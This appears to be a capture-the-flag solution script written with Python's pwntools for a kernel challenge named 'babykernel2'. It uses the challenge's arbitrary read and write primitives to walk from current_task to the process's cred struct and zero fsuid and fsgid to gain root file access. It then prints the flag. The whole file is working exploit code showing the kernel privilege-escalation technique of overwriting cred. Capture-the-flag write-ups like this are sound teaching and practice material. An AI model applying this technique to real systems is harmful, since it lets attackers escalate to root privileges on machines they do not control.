from pwn import *

conn = remote("babykernel2.forfuture.fluxfingers.net", 1337)

def read(addr):
    conn.sendlineafter('> ', str(1))
    conn.sendlineafter('> ', str(hex(addr)))
    resp = conn.recvuntil("---").split()[22]
    return resp

def write(addr, val):
    conn.sendlineafter("> ",str(2))
    conn.sendlineafter("> ",str(hex(addr)))
    conn.sendlineafter("> ",str(val))
    return

def show_flag():
    conn.sendlineafter("> ",str(4))
    conn.sendlineafter("> ","flag")
    print(conn.recvuntil("}"))

#The pointer to current_task struct from System.map stored at current_task
current_task_ptr = 0xffffffff8183a040
current_task = read(current_task_ptr) #address of task_struct
log.info("current_task struct: 0x%s" % current_task)

"""
(gdb) ptype /o struct task_struct
/* 1008      |     8 */    const struct cred *ptracer_cred;
/* 1016      |     8 */    const struct cred *real_cred;
/* 1024      |     8 */    const struct cred *cred;
"""

#Offset of cred_struct into task_struct obtained from gdb
cred_off = 1024 #ptype /o struct task 0x400
cred_struct_ptr = int(current_task, 16) + cred_off

#cred_struct location
cred_struct = int(read(cred_struct_ptr), 16)
log.info("cred_struct: 0x%x" % cred_struct)

"""
(gdb) ptype /o struct cred
/* offset    |  size */  type = struct cred {
/*    0      |     4 */    atomic_t usage;
/*    4      |     4 */    kuid_t uid;
/*    8      |     4 */    kgid_t gid;
/*   12      |     4 */    kuid_t suid;
/*   16      |     4 */    kgid_t sgid;
/*   20      |     4 */    kuid_t euid;
/*   24      |     4 */    kgid_t egid;
/*   28      |     4 */    kuid_t fsuid;
/*   32      |     4 */    kgid_t fsgid;
"""

#exploit part
log.info("Overwriting fsuid")
write(cred_struct+28, 0) #set fsuid = 0, 0 = root privilidges

log.info("Overwriting fsgid")
write(cred_struct+32, 0) #set fsgid = 0

show_flag()